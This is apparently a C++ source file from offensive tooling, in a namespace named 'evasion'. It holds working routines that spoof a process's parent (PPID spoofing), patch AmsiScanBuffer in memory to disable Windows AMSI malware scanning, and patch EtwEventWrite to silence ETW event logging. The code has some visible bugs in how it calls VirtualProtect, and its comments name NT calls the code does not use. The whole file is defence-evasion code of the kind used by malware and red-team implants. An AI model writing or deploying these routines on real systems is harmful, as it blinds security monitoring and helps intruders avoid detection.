#include "evasion.h"
#include <stdio.h>
namespace evasion {

	bool spoof(int pid, STARTUPINFOEXA& si) {
		SIZE_T attributeSize;
		HANDLE parentProcessHandle = INVALID_HANDLE_VALUE;
		parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, pid);
		if (parentProcessHandle == INVALID_HANDLE_VALUE)
			return false;
		InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
		si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
		InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
		UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
		si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

		return true;
	}
	BOOL patchAMSI()
	{

#ifdef _M_AMD64
		unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };//x64
#elif defined(_M_IX86)
		unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
#endif

		HINSTANCE hinst = LoadLibrary("amsi.dll");
		void* pAddress = (PVOID)GetProcAddress(hinst, "AmsiScanBuffer");
		if (pAddress == NULL)
		{
			printf("AmsiScanBuffer failed\n");
			return 0;
		}

		void* lpBaseAddress = pAddress;
		ULONG OldProtection = 0, NewProtection = 0;
		SIZE_T uSize = sizeof(amsiPatch);

		//Change memory protection via NTProtectVirtualMemory
		BOOL res = VirtualProtect((PVOID)&lpBaseAddress, uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
		if (res == FALSE) {
			printf("[-] NtProtectVirtualMemory failed\n");
			return 0;
		}

		//Patch AMSI via NTWriteVirtualMemory
		SIZE_T written;
		res = WriteProcessMemory(GetCurrentProcess(), pAddress, (PVOID)&amsiPatch[0], sizeof(amsiPatch), &written);
		if (res == FALSE) {
			printf("[-] WriteProcessMemory failed\n");
			return 0;
		}
		//Revert back memory protection via NTProtectVirtualMemory
		res = VirtualProtect((PVOID)&lpBaseAddress, uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
		if (res == FALSE) {
			printf("[-] NtProtectVirtualMemory2 failed\n");
			return 0;
		}
		//Successfully patched AMSI
		return 1;
	}
	BOOL patchETW(BOOL revertETW)
	{
#ifdef _M_AMD64
		unsigned char etwPatch[] = { 0 };
#elif defined(_M_IX86)
		unsigned char etwPatch[3] = { 0 };
#endif
		SIZE_T uSize = 8;
		ULONG patchSize = 0;

		if (revertETW != 0) {
#ifdef _M_AMD64
			//revert ETW x64
			patchSize = 1;
			etwPatch[0] = 0x4c;
#elif defined(_M_IX86)
			//revert ETW x86
			patchSize = 3;
			MSVCRT$memcpy((char*)etwPatch, "\x8b\xff\x55", patchSize);
#endif		
		}
		else {
#ifdef _M_AMD64
			//Break ETW x64
			patchSize = 1;
			etwPatch[0] = 0xc3;
#elif defined(_M_IX86)
			//Break ETW x86
			patchSize = 3;
			MSVCRT$memcpy((char*)etwPatch, "\xc2\x14\x00", patchSize);
#endif			
		}

		//Get pointer to EtwEventWrite 
		void* pAddress = (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
		if (pAddress == NULL)
		{
			printf("Getting pointer to EtwEventWrite failed\n");
			return 0;
		}

		void* lpBaseAddress = pAddress;
		ULONG OldProtection = 0, NewProtection = 0;

		//Change memory protection via NTProtectVirtualMemory
		BOOL res = VirtualProtect((PVOID)&lpBaseAddress, uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
		if (res == FALSE) {
			printf("[-] NtProtectVirtualMemory failed\n");
			return 0;
		}

		//Patch ETW via NTWriteVirtualMemory
		SIZE_T written;
		res = WriteProcessMemory(GetCurrentProcess(), pAddress, (PVOID)&etwPatch[0], sizeof(etwPatch) / sizeof(etwPatch[0]), &written);
		if (res == FALSE) {
			printf("[-] WriteProcessMemory failed\n");
			return 0;
		}
		//Revert back memory protection via NTProtectVirtualMemory
		res = VirtualProtect((PVOID)&lpBaseAddress, uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
		if (res == FALSE) {
			printf("[-] NtProtectVirtualMemory2 failed\n");
			return 0;
		}
		//Successfully patched ETW
		return 1;
	}
}
